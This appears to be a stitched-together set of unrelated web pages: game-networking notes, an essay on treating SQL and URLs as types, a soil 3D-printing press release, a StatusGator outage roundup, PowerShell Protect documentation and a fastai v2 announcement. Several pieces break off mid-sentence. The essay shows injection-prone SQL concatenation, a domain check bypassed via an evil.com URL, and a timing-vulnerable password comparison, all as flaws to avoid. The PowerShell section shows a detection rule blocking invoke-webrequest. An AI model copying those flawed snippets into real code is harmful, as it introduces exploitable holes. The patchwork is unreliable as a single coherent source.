<p>As a game developer, you usually don’t care whether a player cheats in your single-player game – his actions don’t affect anyone but him. A cheating player may not experience the game exactly as you planned, but since it’s their game, they have the right to play it in any way they please.</p>
<p>Multiplayer games are different, though. In any competitive game, a cheating player isn’t just making the experience better for himself, he’s also making the experience worse for the other players. As the developer, you probably want to avoid that, since it tends to drive players away from your game.</p>
<p>There are many things that can be done to prevent cheating, but the most important one (and probably the only really meaningful one) is simple :&nbsp;<em>don’t trust the player</em>. Always assume the worst – that players&nbsp;<em>will</em>&nbsp;try to cheat.</p>

<p>This leads to a seemingly simple solution – you make everything in your game happen in a central server under your control, and make the clients just privileged spectators of the game. In other words, your game client sends inputs (key presses, commands) to the server, the server runs the game, and you send the results back to the clients. This is usually called using an&nbsp;<em>authoritative server</em>, because the one and only authority regarding everything that happens in the world is the server.</p>
<p>Of course, your server can be exploited for vulnerabilities, but that’s out of the scope of this series of articles. Using an authoritative server does prevent a wide range of hacks, though. For example, you don’t trust the client with the health of the player; a hacked client can modify its local copy of that value and tell the player it has 10000% health, but the server <em>knows</em> it only has 10% – when the player is attacked it will die, regardless of what a hacked client may think.</p>
<p>You also don’t trust the player with its position in the world. If you did, a hacked client would tell the server “<strong>I’m at (10,10)</strong>” and a second later “<strong>I’m at (20,10)</strong>”, possibly going through a wall or moving faster than the other players. Instead, the server <em>knows</em> the player is at (10,10), the client tells the server “<strong>I want to move one square to the right</strong>”, the server updates its internal state with the new player position at (11,10), and then replies to the player “<strong>You’re at (11, 10)</strong>”:</p>
<figure>
<img src="https://gabrielgambetta.com/img/fpm1-01.png" alt="A simple client-server interaction."><figcaption>A simple client-server interaction.</figcaption>
</figure>
<p>In summary: the game state is managed by the server alone. Clients send their actions to the server. The server updates the game state periodically, and then sends the new game state back to clients, who just render it on the screen.</p>
<h2 id="dealing-with-networks">Dealing with networks</h2>
<p>The dumb client scheme works fine for slow turn based games, for example strategy games or poker. It would also work in a LAN setting, where communications are, for all practical purposes, instantaneous. But this breaks down when used for a fast-paced game over a network such as the internet.</p>
<p>Let’s talk physics. Suppose you’re in San Francisco, connected to a server in the NY. That’s approximately 4,000 km, or 2,500 miles (that’s roughly the distance between Lisbon and Moscow). Nothing can travel faster than light, not even bytes on the Internet (which at the lower level are pulses of light, electrons in a cable, or electromagnetic waves). Light travels at approximately 300,000 km/s, so it takes 13 ms to travel 4,000 km.</p>
<p>This may sound quite fast, but it’s actually a very optimistic setup – it assumes data travels at the speed of light in a straight path, with is most likely not the case. In real life, data goes through a series of jumps (called&nbsp;<em>hops</em> in networking terminology) from router to router, most of which aren’t done at lightspeed; routers themselve introduce a bit of delay, since packets must be copied, inspected, and rerouted.</p>
<p>For the sake of the argument, let’s assume data takes 50 ms from client to server. This is close to a best-case scenario – what happens if you’re in NY connected to a server in Tokyo? What if there’s network congestion for some reason? Delays of 100, 200, even 500 ms are not unheard of.</p>
<p>Back to our example, your client sends some input to the server (“<strong>I pressed the right arrow</strong>”). The server gets it 50 ms later. Let’s say the server processes the request and sends back the updated state immediately. Your client gets the new game state (“<strong>You’re now at (1, 0)</strong>”) 50 ms later.</p>
<p>From your point of view, what happened is that you pressed the right arrow but nothing happened for a tenth of a second; then your character finally moved one square to the right. This perceived&nbsp;<em>lag</em>&nbsp;between your inputs and its consequences may not sound like much, but it’s noticeable – and of course, a lag of half a second isn’t just noticeable, it actually makes the game unplayable.</p>
<h2 id="summary">Summary</h2>
<p>Networked multiplayer games are incredibly fun, but introduce a whole new class of challenges. The authoritative server architecture is pretty good at stopping most cheats, but a straightforward implementation may make games quite unresponsive to the player.</p>
<p>In the following articles, we’ll explore how can we build a system based on an authoritative server, while minimizing the delay experienced by the players, to the point of making it almost indistinguishable from local or single player games.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

  </header>
  <p>As programmers, we have a collective delusion that anything that can be represented as a string, is a string. This thinking causes a whole bunch of problems.</p>

<p>Let’s take SQL for example. Every API in every programming language that I’ve seen considers SQL statement a string.</p>

<div><div><pre><code>function execute(sql: string): Promise&lt;Result&gt;
</code></pre></div></div>

<p>The problem with this API is that not every string is a valid SQL (nor sometimes it is the SQL you actually want to run).</p>

<p>Here’s a classic example of the misuse:</p>

<div><div><pre><code>const query = 'SELECT * FROM posts WHERE id = '
  + params.id;
</code></pre></div></div>

<p>In this example <code>params.id</code> can be anything, including invalid or malicious SQL.</p>

<p>The root problem here is not the lack of sanitization. The problem is that SQL is treated as a string.</p>

<p>Think about JSON for another example. You could certainly implement adding an item to a hash by doing this (I hope this code makes you cringe):</p>

<div><div><pre><code>function addKeyValue(json, key, value) {
  return json.substr(0, json.length - 1)
    + ', "' + key + '": "' + value + '"}';
}
</code></pre></div></div>

<p>As with the SQL example, you could add escaping and sanitization, but it’s just hacks hiding the real problem:</p>

<p><em>A string can be a representation of a thing, but it’s not the thing itself.</em></p>

<p>And it’s not only about concatenating strings. Can you spot the problem with this function? <span onclick="event.target.innerText = 'This URL will be marked as safe by the code below https://evil.com/https://safe.com/'">(see answer)</span></p>

<div><div><pre><code>function isSafeDomain(url: string): boolean {
  return url.includes('https://safe.com/');
}
</code></pre></div></div>

<p>Or in this one? <span onclick="event.target.innerText = 'This code is prone to timing attacks'">(see answer)</span></p>

<div><div><pre><code>function checkPassword(pass: string, hash: string): boolean {
  return sha1(pass) === hash;
}
</code></pre></div></div>

<p>Strings are lower level, and thus are much more flexible than they need to be to properly implement valid operations on the higher level concepts.</p>

<p>Incomplete list of things that are not strings:</p>

<ul>
  <li>SQL</li>
  <li>HTML</li>
  <li>JSON</li>
  <li>URL</li>
  <li>File path</li>
  <li>Password</li>
</ul>

<h2 id="things-are-things">Things are… things</h2>

<p>You can save yourself a lot of headache if you stop treating everything that can be represented as a string, as a string.</p>

<p>Both OO and FP styles allow for abstracting away something as a type or a class. You can make a closed opaque structure for the thing and limit the ways it can be constructed.</p>

<p>For example, for SQL, you might want to make sure it’s only created from static string literals.</p>

<div><div><pre><code>// Allowed
new SQL('SELECT * FROM posts WHERE id = ?');

// No allowed (e.g. via a lint rule)
new SQL('SELECT * FROM posts' + filter);
</code></pre></div></div>

<p>Of course, at some point, you will need to serialize the thing into a string to pass it into an API that was designed to consume a string. Do it at the last possible moment and try to limit it to a single place in the codebase.</p>

<div><div><pre><code>function execute(sql: SQL): Promise&lt;Result&gt; {
  return unsafeExecute(sql.toString());
}
</code></pre></div></div>

<p>Strings are coming into your app from the outer world. Don’t trust them to be what they seem they are. Convert them into proper things as soon as possible, and convert them back to strings as late as possible.</p>

<p>Here’s a few libraries for inspiration of how to treat things as… things:</p>

<ul>
  <li>SQL: <a href="https://github.com/gajus/slonik">Slonik</a>, <a href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/basic-linq-query-operations">LINQ</a></li>
  <li>HTML: React, Elm, <a href="https://github.com/tonsky/rum">rum</a></li>
  <li>JSON: a dictionary in any programming language</li>
  <li>URL: <a href="https://docs.rs/url/2.1.1/url/">url - Rust</a></li>
  <li>File paths: <a href="https://doc.rust-lang.org/std/path/struct.Path.html">std::path::Path - Rust</a></li>
  <li>Passwords: <a href="https://github.com/myfreeweb/secstr">secstr</a>, <a href="https://hackage.haskell.org/package/securemem">securemem</a></li>
</ul>

While concrete is the material of choice for many construction projects, it has a large carbon footprint, resulting in high waste and energy expenditure. , researchers report progress toward a sustainable building material made from local soil, using a 3D printer to create a load-bearing structure.</p><p>The researchers presented their results today at the American Chemical Society (ACS) Fall 2020 Virtual Meeting &amp; Expo. ACS held the meeting through Thursday. It featured more than 6,000 presentations on a wide range of science topics.</p><p>“The environmental impact of the construction industry is an issue of growing concern,” says Sarbajit Banerjee, Ph.D., the project’s principal investigator. “Some researchers have turned to additive manufacturing, or building structures layer by layer, which is often done with a 3D printer. That advance has begun to transform this sector in terms of reducing waste, but the materials used in the process need to be sustainable as well.”</p><p>For example, construction projects using extruded layers of concrete have highlighted the potential of additive manufacturing for building structures quickly and cheaply. However, concrete manufacturing is responsible for approximately 7% of carbon dioxide emissions according to the International Energy Agency, and cannot be recycled.</p><p>“Historically, humans used to build with locally sourced materials, such as adobe, but the move to concrete has raised many environmental issues,” says Aayushi Bajpayee, a graduate student in Banerjee’s lab at Texas A&amp;M University. She is presenting the work at the meeting. “Our thought was to turn the clock back and find a way to adapt materials from our own backyards as a potential replacement for concrete.”</p><p>An advantage to using local soil in construction is that the materials would not need to be manufactured and transported to the building site, reducing both costs and environmental damage. Banerjee and Bajpayee also say that additive manufacturing with soil could one day be used beyond Earth, to create settlements on the moon or even Mars.</p><p>Soil is typically classified by the layers of materials it comprises, beginning with the top organic layer where plants grow and ending at the hard bedrock of the earth’s crust. Beneath the initial organic layer is clay, which gives soil its plastic, moldable character that the researchers capitalized on in their project.</p><p>The researchers began by collecting soil samples from a colleague’s backyard and tailoring the material with a new environmentally friendly additive so that it would bind together and be easily extruded through the 3D printer. Because soils vary greatly by location, their aim was to have a chemistry “toolkit” that could transform any type of soil into printable building material. From there Bajpayee built small-scale test structures, cubes measuring two inches on each side, to see how the material performed when extruded into stacked layers.</p><figure data-orig-width="720" data-orig-height="862"><img src="https://64.media.tumblr.com/55d595d3f207db7dc19ff800ff843dea/3a3a3d5823a5b6e0-f9/s1280x1920/71f447a5e76e3b559eda901a3aafc344ba278485.jpg" alt="image" data-orig-width="720" data-orig-height="862" width="720" height="862"></figure><p><i>Image:&nbsp;“Scientists have developed a method to 3D print structures using local soil.”.

To help with this, the researchers strengthened the clay mixture by “zippering” the microscopic layers on its surface to prevent it from absorbing water and expanding, which would compromise the printed structure. With this method, the researchers showed that the material could hold twice as much weight as the unmodified clay mixture.</p><p>Next, the team plans to improve the soil’s load-bearing capabilities in order to scale up their test structures and get as close to a replacement for concrete as possible. In addition, they are gathering data to see whether these 3D printed structures are as environmentally friendly as they envision, especially in terms of carbon footprint and recycling potential. Once they have a better picture of the chemistry, functionality and feasibility of building with local soils, they plan to further explore how this technology can be used beyond our own planet.</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.acs.org%2Fcontent%2Facs%2Fen%2Fpressroom%2Fnewsreleases%2F2020%2Faugust%2F3d-printing-greener-buildings-using-local-soil.html&amp;t=ZWFhMGEwMzc2NjFhNDgxYzBmMjI0ZDcxZTM5ZTcxNWM3ODVmYzk2MixJS3pwaTBtcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627087631269888000%2F3d-printing-buildings-with-local-soil&amp;m=0&amp;ts=1598316754">American Chemical Society</a></b></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/620672066180595712/rice-university-4d-printing">Rice University lab makes 4D printing more practical</a></p>

<p>Anything bad that can happen — will happen. This old adage applies 100% to the technology industry, where crashes and outages are far more common than the sales and marketing teams would want us to think. However, DevOps engineers that deal with infrastructure know how hard it is to ensure everything works as intended all of the time — and to configure monitoring that actually keeps track of a system’s health and helps prevent crashes and downtime.&nbsp;</p>
<p>At <a href="https://statusgator.com/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener follow" data-wpel-link="internal">StatusGator </a>we monitor the status pages of more than 800 cloud-based services and deliver instant notifications to our users. We have mountains of data on downtime and outages and see the full picture, so we decided to make a quarterly top downtime list. We hope our findings will motivate DevOps engineers to see how others deal with service outages so they can improve their own reliability.&nbsp;</p>
<p>Read on to find out about the five biggest outages of Q2 2020 and how Slack, Zoom, GitHub, IBM Cloud and T-Mobile acted during these crises. We also rate the outcomes of these outages and would be glad to hear your thoughts on our ratings.</p>
<h2>Outage #1 – <strong>World-wide Slack outage, May 12, 2020</strong></h2>
<p>Slack is the primary means of communication for thousands of companies worldwide, so its stable uptime is a matter of utmost importance. Thus, when users stopped being able to send and receive Slack messages around 7:30 PM EDT, the situation quickly escalated into a full-scale problem. Unlike during previous outages, this affected the entire Slack ecosystem: nobody could log in to Slack or receive any notifications. “Is Slack down?”, the users asked themselves and the answer was an undeniable “Yes!”</p>

<p>Anyone using the Slack Electron app was getting a generic HTTP error. Even the next day, after the issue had been resolved, people using the Slack app were still seeing the same error message. The app doesn’t refresh automatically so it was confusing for non-technical users, many of whom didn’t know they had to press Ctrl-R to refresh the app and restore service after the error.</p>
<p>The company confirmed they were aware of a situation and posted regular updates to <a href="https://status.slack.com/2020-05/147dad376c8946ff" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" data-wpel-link="external">the Slack status page</a>. Quite importantly, these updates were not standardized ‘we are aware of the situation, please stand by’ responses.</p>
<figure></figure>
<p>Team representatives wrote detailed messages that showed customers the Slack team were transparent about the challenge they faced and the efforts they made to overcome it.</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">We are seeing performance improvements and you may be able to connect once again. We're working to fully restore service for everyone. Thank you for bearing with us.</p>— Slack (@SlackHQ) <a href="https://twitter.com/SlackHQ/status/1260378685334409216?ref_src=twsrc%5Etfw" data-wpel-link="external" target="_blank" rel="nofollow">May 13, 2020</a></blockquote>
</div></figure>
<p>At 10:26 PM EDT Slack reported full restoration of services and apologized for the inconvenience once again. Even more importantly, they published a detailed <a href="https://slack.engineering/a-terrible-horrible-no-good-very-bad-day-at-slack-dfe05b485f82" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" data-wpel-link="external">postmortem</a> on Medium, explaining the reasons behind the issue, the actions they performed to overcome it, the conclusions they came to, and the measures they were undertaking to eliminate the chance of a similar situation happening again.</p>
<p>Feel free to read this postmortem, it is very technical yet quite understandable even for laypersons. Slack demonstrates here that they care about members of their user base — both developers and the mass user base, and the confidence this article projects is admirable.</p>
<p>An important thing to note here is that while the issue itself started at 8:30 AM EDT, the issue went completely under the radar till around 7:30 PM EDT when multiple users reported issues with Slack. They reported them inside the app (which was mostly down by that time), on Twitter, on Downdetector, on the Slack website (which went down too quite soon) and through many other channels, before the Slack team became aware of the situation.&nbsp;</p>
<p>Getting notified about an outage would have been much faster and easier with StatusGator, where you can aggregate multiple status pages into one dashboard. StatusGator can send centralized notifications on downtimes for any services and APIs, and you can enjoy it with a <a href="https://statusgator.com/plans" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener follow" data-wpel-link="internal">free subscription plan</a>!</p>
<h2>Outage #2 – <strong>Zoom shutdown, May 17, 2020</strong></h2>
<p>Zoom usage has gone up dramatically since the Coronavirus pandemic began as more people work and study remotely. So have subscriptions to the Zoom status page, which have skyrocketed in StatusGator since April.&nbsp;</p>
<figure><img src="https://lh4.googleusercontent.com/2sgE3LGne0_xP2m3OP2ekivYBcg0PAOYeLqKRhTfEHZH6obapJBvPpiDy-1aYNSeaTUbgl220ZStj5_YWrayRzGfOvY6Uqt1WOLd4qQRDYTZAYgWcYAmqmLkoCOJvbQhTmRmswLA" alt=""></figure>
<p>Aside from businesses being forced to begin working remotely, many churches and other public organizations started using Zoom to hold Sunday masses, meetings, and to host public events. Thus, while Sunday is not a business day, many paid accounts in the UK quickly noticed that they were not able to host or join Zoom meetings (free accounts seemed not to be affected). The issue was reported through multiple channels, including Twitter and StatusGator that monitors the status of Zoom.</p>
<p>A Zoom spokesperson responded, acknowledging awareness of the situation and mentioning it was only affecting a subset of users. However, we all know a subset might be 1% or 99% and Zoom provided no indication whatsoever as to the volume of users affected. Providing more transparency into the percentage of affected users is a hallmark of a quality status page, something Zoom should improve.</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Hi there – We have received reports that Zoom users may be experiencing issues hosting and joining meetings. Please see <a href="https://t.co/aqz5nS7fZY" data-wpel-link="external" target="_blank" rel="nofollow">https://t.co/aqz5nS7fZY</a> for updates.</p>— Zoom (@zoom_us) <a href="https://twitter.com/zoom_us/status/1262025037999214595?ref_src=twsrc%5Etfw" data-wpel-link="external" target="_blank" rel="nofollow">May 17, 2020</a></blockquote>
</div></figure>
<p>The issue was reported resolved by 11:40 AM EDT, but Zoom provided no explanation or postmortem of any kind. Such an attitude, along with <a aria-label="undefined (opens in a new tab)" href="https://www.theverge.com/2020/3/27/21197090/zoombombing-zoom-stop-how-to-porn-trolls-video-chat-screen-sharing" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">Zoombombing</a> and a “Company Directory” checkbox in settings allowing users to <a aria-label="undefined (opens in a new tab)" href="https://www.theverge.com/2020/3/31/21201956/zoom-leak-user-information-email-addresses-photos-contacts-directory" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">leak corporate photos and emails</a> is one of the reasons many users are now actively seeking better alternatives to Zoom.</p>
<h2>Outage #3 – <strong>GitHub was inaccessible… Again. June 29, 2020</strong></h2>
<p>GitHub seems to be down a lot more since its $7.5 billion <a aria-label="undefined (opens in a new tab)" href="https://blogs.microsoft.com/blog/2018/10/26/microsoft-completes-github-acquisition/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">acquisition by Microsoft</a>. The reasons have not been disclosed, and we can only speculate on the causes. Maybe it has something to do with integrating GitHub infrastructure with Microsoft systems. Maybe it’s because GitHub has been moving faster and adding more features. In any case, it’s been almost two years since the acquisition, and users are noticing more sustained periods of downtime at GitHub. Our independent <a aria-label="undefined (opens in a new tab)" href="https://statusgator.com/blog/2020/06/04/has-github-been-down-more-since-its-acquisition-by-microsoft/" target="_blank" rel="noreferrer noopener follow" data-wpel-link="internal">analysis of the GitHub status page</a> confirms that the outages became more frequent over the past two years.</p>
<p>Microsoft is working hard to turn GitHub into an even better place for developers than it was before. The Redmond giant made all of the paid plans more affordable earlier this year and offered some key features for free to place more tools at the disposal of IT professionals. Microsoft, Apple, AWS, Google, Facebook and thousands of other companies use GitHub to store and run their code repositories, so its uptime is of utmost importance.</p>
<p>Nevertheless, GitHub was down for two hours on June 29, 2020. The entire website and its services were inaccessible, so many developers were not even able to push code or deploy their apps due to the number of GitHub integrations that were unresponsive. Naturally, this caused a major backlash and caused <a aria-label="undefined (opens in a new tab)" href="https://github.blog/2020-07-08-introducing-the-github-availability-report/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">GitHub to introduce a monthly availability report</a> in addition to its status page, providing detailed explanations of the reasons and outcomes of every outage.&nbsp;&nbsp;</p>
<h2>Outage #4 – <strong>IBM Cloud went down along with the status page, June 10, 2020</strong></h2>
<p>One of the biggest mistakes any cloud-based service can do is to host its status page on its own infrastructure. It appears IBM Cloud did just that, so when its whole infrastructure became inaccessible for several hours in June, its status page followed suit. We could have expected IBM to draw some conclusions after the <a href="https://www.datacenterdynamics.com/en/news/ibm-cloud-struggles-suffers-small-outage-dallas/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" data-wpel-link="external">Dallas downtime this March</a>, but, apparently, they did not bother, or did not make enough effort.</p>
<p>Thus, on June 10, 2020, the IBM Cloud infrastructure went down globally. This outage rendered features like Watson AI, IBM Cloud Foundry, Kubernetes Service, Cloud Object Storage, Identity Access and Management, VPN for VPS, App Connect and others completely inaccessible. Fortunately, the IBM Cloud status page was unavailable only in the early stages of the outage and became available intermittently later. That’s why StatusGator was still able to send alerts to users who had subscribed to the IBM Cloud status page.</p>
<p>The company totally failed to communicate the reasons for the outage, as well as the steps it took to alleviate the impact. It later became known from an independent monitoring service, that a 3rd-party network provider had extensively used the traffic routes, which resulted in severe constraints on the IBM Cloud configuration bandwidth. IBM specialists reconfigured their systems and restored operations, but no official explanations or announcements ensued — much to the disappointment of users.&nbsp;</p>
<p>It is not the first time IBM has failed at public relations, nor, we think, will it be the last. This is probably one of the reasons for them to fall so far behind AWS, Google Cloud Platform, Microsoft Azure, and other cloud providers, despite delivering a diverse range of competitive cloud services.</p>
<p>But what could IBM have done? Had an independent status page, naturally! Below are just some of the variants they could have used:</p>
<ol><li><a aria-label="undefined (opens in a new tab)" href="https://statuspage.io/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">StatusPage.io</a>. The largest and most popular platform around. This is probably the only provider big enough to handle companies like IBM Cloud.</li><li><a aria-label="undefined (opens in a new tab)" href="https://status.io/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">Status.io</a>. Another large and widely used status page provider with infrastructure meeting the scale that IBM Cloud would require.&nbsp;</li><li>Alternatively, they could build their own status page, being careful <a href="https://statusgator.com/blog/2020/04/21/your-status-page-deserves-its-own-domain/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener follow" data-wpel-link="internal">not to be dependent on any of their own infrastructure</a>. IBM could host it as a static page on a third-party CDN to reduce complexity and dependency on its network.</li></ol>

<h2>Outage #5 – <strong>T-Mobile Flushes Its Network Down the Drain, June 15, 2020</strong></h2>
<p>T-Mobile, one of the largest mobile network operators in the US, the EU and the UK, recently found itself amid a perfect storm, when it failed to provide voice and text messaging for 13 hours straight across the US. …</p></div></article></div></div></div></div>

Once it is registered with the operating system it will scan all PowerShell scripts that are executed on the machine.</p><p>PowerShell Protect is highly configurable via XML files to provide the ability to filter the scripts that are audited and blocked. You can use filters such as command, content, path, domain controller status and administrator access.</p><p>If a filter is matched you can configure both auditing and blocking. When auditing is enabled, you can send event information to a file, a TCP port or an HTTP server. If blocking is enabled, the matched script will be prevented from running.</p><h2 id="installing-powershell-protect">Installing PowerShell Protect</h2><p>PowerShell Protect is distributed as a PowerShell module. You can download it by using <code>Install-Module</code>.</p><pre><code>Install-Module PowerShellProtect
</code></pre><p>Once you have the module installed, you can use the <code>Install-PowerShellProtect</code> to register the PowerShell Protect AMSI provider. You will need administrative permissions to install the provider. PowerShell Protect is supported on Windows 10 and above as well as Windows Server 2016 and above.</p><h2 id="creating-a-filtering-rule">Creating a filtering rule</h2><p>There are numerous properties that you can use to define filters for PowerShell protect rules. Some of these properties include script content, PowerShell command, administrative permissions, domain controller status and domain name. For a full list of properties, visit our <a href="https://docs.powershellprotect.com/rules#properties">documentation</a>.</p><p>PowerShell Protect is configured using an XML file. There are several places you can use to configure the system. The easiest to use when developing rules is by create a configuration file in <code>%ProgramData%\PowerShellProtect\config.xml</code>. For other options, visit out <a href="https://docs.powershellprotect.com/configuration">documentation</a>.</p><p>Rules are made up of a series of conditions. For the rule to match, all the conditions must be met. Each condition checks a property of the script’s execution context. You can use various <a href="https://docs.powershellprotect.com/rules#operators">operators</a> to match the value you wish. These include expressions like equals, not equals, contains, and even regular expressions.</p><p>The below example will match conditions will match the <code>Invoke-WebRequest</code> command. Matching is case-insensitive.</p><pre><code>&lt;Conditions&gt;
    &lt;Condition&gt;
        &lt;Property&gt;command&lt;/Property&gt;
        &lt;Operator&gt;contains&lt;/Operator&gt;
        &lt;Value&gt;invoke-webrequest&lt;/Value&gt;
    &lt;/Condition&gt;
&lt;/Conditions&gt;
</code></pre><h3 id="taking-action-based-on-a-rule">Taking action based on a rule</h3><p>When a rule matches, you can assign one or more actions to take place. The available actions are auditing to a file, TCP or HTTP server and blocking.</p><p>The first step is to define the available actions and settings for the type of action you wish to take. This allows you to use the action for multiple rules.</p><p>The following example configurations actions for auditing to the <code>%temp%\test.txt</code> file using a custom format and blocking. The name is used when referencing the action within the rule.</p><pre><code>&lt;Actions&gt;
    &lt;Action&gt;
        &lt;Name&gt;File&lt;/Name&gt;

        &lt;Type&gt;Block&lt;/Type&gt;
    &lt;/Action&gt;
&lt;/Actions&gt;
</code></pre><p>To assign an action to a rule, you can use the <code>Action</code> and <code>ActionRef</code> nodes.</p><pre><code>&lt;Actions&gt;

<h2 id="fastai-v2">fastai v2</h2>
<p>fastai is a deep learning library which provides practitioners with high-level components that can quickly and easily provide state-of-the-art results in standard deep learning domains, and provides researchers with low-level components that can be mixed and matched to build new approaches. It aims to do both things without substantial compromises in ease of use, flexibility, or performance. This is possible thanks to a carefully layered architecture, which expresses common underlying patterns of many deep learning and data processing techniques in terms of decoupled abstractions. These abstractions can be expressed concisely and clearly by leveraging the dynamism of the underlying Python language and the flexibility of the PyTorch library. fastai includes:</p>
<ul>
<li>A new type dispatch system for Python along with a semantic type hierarchy for tensors</li>
<li>A GPU-optimized computer vision library which can be extended in pure Python</li>
<li>An optimizer which refactors out the common functionality of modern optimizers into two basic pieces, allowing optimization algorithms to be implemented in 45 lines of code</li>
<li>A novel 2-way callback system that can access any part of the data, model, or optimizer and change it at any point during training</li>
<li>A new data block API</li>
<li>And much more…</li>
</ul>

<p>fastai is organized around two main design goals: to be approachable and rapidly productive, while also being deeply hackable and configurable. It is built on top of a hierarchy of lower-level APIs which provide composable building blocks. This way, a user wanting to rewrite part of the high-level API or add particular behavior to suit their needs does not have to learn how to use the lowest level.</p>
<p>To see what’s possible with fastai, take a look at the <a href="https://docs.fast.ai/quick_start.html">Quick Start</a>, which shows how to use around 5 lines of code to build an image classifier, an image segmentation model, a text sentiment model, a recommendation system, and a tabular model. For each of the applications, the code is much the same.</p>

<figcaption>Example of using fastai for image segmentation</figcaption>
</figure>
<p>Read through the <a href="https://docs.fast.ai/tutorial">Tutorials</a> to learn how to train your own models on your own datasets. Use the navigation sidebar to look through the fastai documentation. Every class, function, and method is documented here. To learn about the design and motivation of the library, read the <a href="https://www.mdpi.com/2078-2489/11/2/108/htm">peer reviewed paper</a>, or watch <a href="https://youtu.be/bHVqO5YyNbU">this presentation</a> summarizing some of the key design points.</p>
<p>All fast.ai projects, including fastai, are built with <a href="https://nbdev.fast.ai/">nbdev</a>, which is a full <a href="https://www.fast.ai/2019/12/02/nbdev/">literate programming environment</a> built on Jupyter Notebooks. That means that every piece of documentation can be accessed as interactive Jupyter notebooks, and every documentation page includes a link to open it directly on Google Colab to allow for experimentation and customization.</p>
<p>It’s very easy to migrate from plain PyTorch, Ignite, or any other PyTorch-based library, or even to use fastai in conjunction with other libraries. Generally, you’ll be able to use all your existing data processing code, but will be able to reduce the amount of code you require for training, and more easily take advantage of modern best practices. Here are migration guides from some popular libraries to help you on your way: <a href="https://docs.fast.ai/migrating_pytorch">Plain PyTorch</a>; <a href="https://docs.fast.ai/migrating_ignite">Ignite</a>; <a href="https://docs.fast.ai/migrating_lightning">Lightning</a>; <a href="https://docs.fast.ai/migrating_catalyst">Catalyst</a>. And because it’s easy to combine and part of the fastai framework with your existing code and libraries, you can just pick the bits you want. For instance, you could use fastai’s GPU-accelerated computer vision library, along with your own training loop.</p>
<p>fastai includes many modules that add functionality, generally through callbacks. Thanks to the flexible infrastructure, these all work together, so you can pick and choose what you need (and add your own), including: <a href="https://arxiv.org/abs/1710.09412">mixup</a> and <a href="https://arxiv.org/abs/1708.04552">cutout</a> augmentation, a uniquely flexible <a href="https://docs.fast.ai/vision.gan.html">GAN training</a> framework, a range of schedulers (many of which aren’t available in any other framework) including support for fine tuning following the approach described in <a href="https://arxiv.org/abs/1801.06146">ULMFiT</a>, mixed precision, gradient accumulation, support for a range of logging frameworks like Tensorboard (with particularly strong support for Weights and Biases, as <a href="https://app.wandb.ai/borisd13/demo_config/reports/Visualize-track-compare-Fastai-models--Vmlldzo4MzAyNA">demonstrated here</a>), <a href="http://docs.fast.ai/medical.imaging">medical imaging</a>, and much more. Other functionality is added through the <a href="https://github.com/nestordemeure/fastai-extensions-repository">fastai ecosystem</a>, such as support for <a href="https://ohmeow.github.io/blurr/">HuggingFace Transformers</a> (which can also be done manually, as shown in <a href="http://docs.fast.ai/tutorial.transformers">this tutorial</a>), <a href="https://github.com/rbracco/fastai2_audio">audio</a>, <a href="https://muellerzr.github.io/fastinference/inference/">accelerated inference</a>, and so forth.</p>

<p>There’s already some great learning material made available for fastai v2 by the community, such as the “Zero to Hero” series by Zach Mueller: <a href="https://muellerzr.github.io/fastblog/2020/08/20/_08_21-beginner.html">part 1</a>; <a href="https://muellerzr.github.io/fastblog/2020/08/20/_08_21-intermediate.html">part 2</a>.</p>
<h2 id="practical-deep-learning-for-coders-the-course">Practical Deep Learning for Coders, the course</h2>
<p>Previous fast.ai courses have been studied by hundreds of thousands of students, from all walks of life, from all parts of the world. Many students have told us about how they’ve become <a href="https://forums.fast.ai/t/my-first-gold-medal/54237">multiple gold medal winners</a> of <a href="https://towardsdatascience.com/my-3-year-journey-from-zero-python-to-deep-learning-competition-master-6605c188eec7">international machine learning competitions</a>, <a href="https://forums.fast.ai/t/how-has-your-journey-been-so-far-learners/6480/2">received offers</a> from top companies, and <a href="https://icml-compbio.github.io/2020/papers/WCBICML2020_paper_67.pdf">having</a> <a href="https://ui.adsabs.harvard.edu/abs/2020EGUGA..2221465A/abstract">research</a> <a href="https://arxiv.org/pdf/2004.14356.pdf">papers</a> <a href="https://pubs.rsna.org/doi/abs/10.1148/ryai.2019190113?journalCode=ai">published</a>. For instance, Isaac Dimitrovsky <a href="https://forums.fast.ai/t/thanks-ra2-dream-challenge-win/76875">told us</a> that he had “<em>been playing around with ML for a couple of years without really grokking it… [then] went through the fast.ai part 1 course late last year, and it clicked for me</em>”. He went on to achieve first place in the prestigious international <a href="https://www.synapse.org/#!Synapse:syn20545111/wiki/594083">RA2-DREAM Challenge</a> competition! He developed a <a href="https://www.synapse.org/#!Synapse:syn21478998/wiki/604432">multistage deep learning method</a> for scoring radiographic hand and foot joint damage in rheumatoid arthritis, taking advantage of the fastai library.</p>
<p><a href="https://course.fast.ai/">This year’s course</a> takes things even further. It incorporates both machine learning and deep learning in a single course, covering topics like random forests, gradient boosting, test and validation sets, and p values, which previously were in a separate machine learning course. In addition, production and deployment are also covered, including material on developing a web-based GUI for our own deep learning powered apps. The only prerequisite is high-school math, and a year of coding experience (preferably in Python). The course was recorded live, in conjunction with the <a href="https://www.usfca.edu/data-institute">Data Institute</a> at the University of San Francisco.</p>
<p>After finishing this course you will know:</p>
<ul>
<li>How to train models that achieve state-of-the-art results in:
<ul>
